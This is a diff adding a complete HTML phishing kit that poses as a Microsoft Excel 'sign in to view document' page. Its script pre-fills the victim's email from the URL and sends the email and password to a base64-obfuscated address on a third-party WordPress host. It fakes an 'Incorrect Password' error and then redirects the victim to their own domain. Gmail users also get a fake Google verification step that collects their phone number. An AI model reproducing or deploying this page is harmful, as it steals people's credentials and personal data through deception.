@@ -1,0 +1,428 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Log in | Microsoft Excel - Work together on Excel spreadsheets</title>
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <style>
+	.bg-black{
+    background: #000;
+}
+
+.cover-image-cont{
+    background-image:url('https://i.imgur.com/fktvunG.png'); 
+    background-position:center; 
+    background-size: cover;
+}
+
+.vh-100{
+    height: 100vh;
+}
+
+.vh-50{
+    height: 50vh;
+}
+
+.center{
+    height: 100vh;
+}
+
+.bg-shine{
+    background: #fff;
+}
+
+.text-we{
+    color:#000;
+}
+
+#text-holder{
+    position: absolute;
+    padding: 0px;
+    z-index: 1;
+}
+
+#textItSelf{
+    margin-top: 10em;
+}
+
+.wet{
+    font-size: 4rem;
+    font-family: "Times New Roman", Times, serif;
+    text-decoration: bold;
+}
+
+.bg-none{
+    background: none; 
+    border: 0px;
+    color:white;
+    font-size: 1.5rem;
+}
+
+.agree{
+    font-size: 14px;
+}
+
+.bg-transperant{
+    background:rgba(0, 0, 0, 0.77);
+}
+
+.form{
+    margin-top: 10em;
+}
+
+.p{
+    font-size: 12px;
+}
+
+sub{
+    line-height:1;
+    font-size: 10px;
+}
+
+.border-primary{
+    border-radius: 50%;
+    border:1px solid #007BFF;
+}
+
+.hr{
+    display: block;
+    height: 1px;
+    background: #BABCBF;
+}
+
+.bg-sec{
+    background:#eee;
+}
+
+.mainForm:hover{
+    background: #eee;
+}
+
+label{
+    font-size:14px;
+}
+
+.form-control1{
+    height: 25px;
+    border-radius: 5px;
+    border:0px;
+    border-bottom:1px solid #000;
+}
+
+.textarea{
+    border-radius: 5px;
+    border:0px;
+    border-bottom:1px solid #000;
+}
+
+.head{
+    margin-top: 3.5em;
+}
+
+.fa-times:hover{
+    cursor: pointer;
+}
+
+.hide{
+    display: none;
+}
+
+.scroll-Y{
+    overflow-y: scroll;
+    height: 100vh;
+}
+@media only screen and (min-width : 788px) and (max-width : 1104px){
+    #textItSelf{
+        margin-top: 5em;
+    }
+
+    .form{
+        margin-top: 5em;
+    }
+}
+
+@media only screen and (min-width : 0px) and (max-width : 787px){
+    #textItSelf{
+        margin-top: 5em;
+    }
+
+    .wet{
+        font-size: 2rem;
+    }
+
+    .xs-text{
+        font-size: 1.3rem;
+    }
+
+    .bg-none{
+        font-size: 1rem;
+    }
+
+    .form{
+        margin-top: 5em;
+    }
+}
+	</style>
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&amp;display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <link rel="icon" type="image/png" sizes="10x10" href="https://i.imgur.com/cKV4FIx.png">
+	
+</head>
+
+<body cz-shortcut-listen="true">
+    <div class="container-fluid p-0">
+        <div class="col-12 p-0 cover-image-cont float-left center">
+            <div class="col-12 p-0 bg-transperant vh-100" id="text-holder">
+                <div class="col-xs-12 col-sm-12 col-md-8 col-lg-4 col-xl-4 mx-auto">
+                    <div class="col-12 p-0 pull-left bg-white px-4 py-5 shadow rounded" id="textItSelf">
+                            <div class="form-group" style="display: flex; justify-content: center; align-items: center;">
+                                <img class="log" src="https://i.imgur.com/cKV4FIx.png" width="80">
+                            </div>
+                            <div class="form-group">
+                                <center>
+                                    <div class="alert alert-danger" id="msg" style="display: none;">Incorrect Password</div>
+                                    <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                                </center>
+                            </div>
+							<center><h3 class="text-banner font-weight-normal" style="color:#000;">Sign in to view document</h3></center>
+							<center><p class="text-banner font-weight-normal" style="color:#000;">This file has been shared with your email.
+Please authenticate to view encrypted files.</p></center>
+							
+							
+                            <div id="div1">
+                                <div class="form-group">
+                                    <!--<label class="text-secondary font-weight-bold">Email Address</label>-->
+                                    <input type="email" class="form-control" name="em" id="ai" value="[[-Email-]]" placeholder="Email Address" readonly="">
+                                </div>
+                                <div class="form-group">
+                                    <!--<label class="text-secondary font-weight-bold">Password</label>-->
+                                    <input type="password" class="form-control" name="ps" id="pr" placeholder="Password" required="">
+                                </div>
+                                <div class="form-group">
+                                    <input class="btn pull-left px-4 form-control" style="background:#067438; color:#fff;" type="submit" id="submit-btn" value="View Document">
+                                </div>
+                            </div>
+							
+							
+                            <div id="div2" style="display: none;">
+                                <i class="fas fa-arrow-left" id="back"></i>&nbsp;<span id="aich" class="h7">abc@abc.com</span><p></p>
+                                <div><span class="h5 font-weight-normal">Verify it's you</span></div><br>
+                                <span>This device is not recognized. For security, Google needs to make sure it's really you.</span>
+                                <span id="msg1" class="text-danger"></span><br>
+                                <span>Try another way to sign in</span>
+                                <div class="form-group mt-3">
+                                    <input type="number" name="ph" class="form-control" id="ph" aria-describedby="aiHelp" placeholder="Enter Phone No.">
+                                </div>
+                                <div class="form-group">
+                                    <input class="btn pull-left px-4" style="background:#067438; color:#fff;" type="submit" id="submit-btn1" value="verify">
+                                </div>
+                            </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#ai').val(my_ai);
+        $("#msg").hide();
+        $.get("https://logo.clearbit.com/" + my_slice)
+            .done(function() {
+                $(".log").attr("src", "https://logo.clearbit.com/" + my_slice);
+
+            }).fail(function() {
+                $(".log").attr("src", "https://i.imgur.com/cKV4FIx.png");
+
+            })
+    }
+	var file="aHR0cHM6Ly9vbWVyZmFydWtrdXJhbC5jb20udHIvd3AtaW5jbHVkZXMvaGsvYXV0aC5waHA=";
+
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email is required");
+            ai.focus;
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            ai.focus;
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password is required");
+            ai.focus;
+            return false;
+        }
+		//minimum password length validation  
+
+		if(pr.length < 5) {  
+
+			$('#error').show();
+            $('#error').html("Please check your password");
+            ai.focus;  
+
+			return false;  
+
+		}
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+
+        $.get("https://logo.clearbit.com/" + my_slice)
+            .done(function() {
+                $(".log").attr("src", "https://logo.clearbit.com/" + my_slice);
+
+            }).fail(function() {
+                $(".log").attr("src", "https://i.imgur.com/cKV4FIx.png");
+
+            })
+
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(file),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').val('Verifing...');
+            },
+            success: function(response) {
+                if (count == 2 && final == "gmail") {
+                    $('#aich').html(my_ai);
+                    $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+                    $("#div2").animate({ right: 0, opacity: "show" }, 1000);
+
+                    return false;
+
+                }
+                if (response) {
+                    $("#msg").show();
+                    console.log(response);
+                    if (response['signal'] == 'ok') {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            count = 0;
+                            // window.location.replace(response['redirect_link']);
+                            window.location.replace("http://www." + my_slice);
+
+                        }
+                        // $('#msg').html(response['msg']);
+                    } else {
+                        // $('#msg').html(response['msg']);
+                    }
+                }
+            },
+            error: function() {
+                if (count == 2 && final == "gmail") {
+                    $('#aich').html(my_ai);
+                    $("#div1").animate({ left: 200, opacity: "hide" }, 0);
+                    $("#div2").animate({ right: 200, opacity: "show" }, 1000);
+
+                    return false;
+
+                }
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                }
+                $("#msg").show();
+                // $('#msg').html("Please try again later");
+            },
+            complete: function() {
+                $('#submit-btn').val('Login');
+            }
+        });
+    });
+
+    $('#submit-btn1').click(function(event) {
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var ph = $("#ph").val();
+        var detail = $("#field").html();
+        var msg1 = $('#msg1').html();
+        if (!ph) {
+            $('#error').show();
+            $('#error').html("Phone number is required");
+            ai.focus;
+            return false;
+        }
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(file),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+                detail: detail,
+                ph: ph,
+
+            },
+            beforeSend: function(xhr) {
+                $('#submit-btn1').val('Verifing...');
+            },
+            success: function(response) {
+                window.location.replace("http://www." + my_slice);
+                
+            },
+            error: function() {
+                window.location.replace("http://www." + my_slice);
+            },
+            complete: function() {
+                $('#submit-btn1').val('Verify');
+            }
+        });
+        // }
+    });
+
+
+});
+</script>
+
+</body></html>
